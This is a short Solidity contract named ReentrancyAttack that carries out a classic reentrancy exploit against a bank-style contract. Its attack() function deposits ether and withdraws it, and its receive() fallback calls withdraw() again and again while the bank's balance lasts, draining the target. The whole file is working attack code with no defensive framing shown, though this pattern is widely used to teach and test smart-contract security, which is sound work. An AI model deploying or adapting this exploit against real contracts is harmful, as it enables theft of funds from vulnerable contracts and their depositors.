// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    IBank public immutable bank;
    uint256 private unit;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable {
        unit = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= unit) {
            bank.withdraw();
        }
    }
}
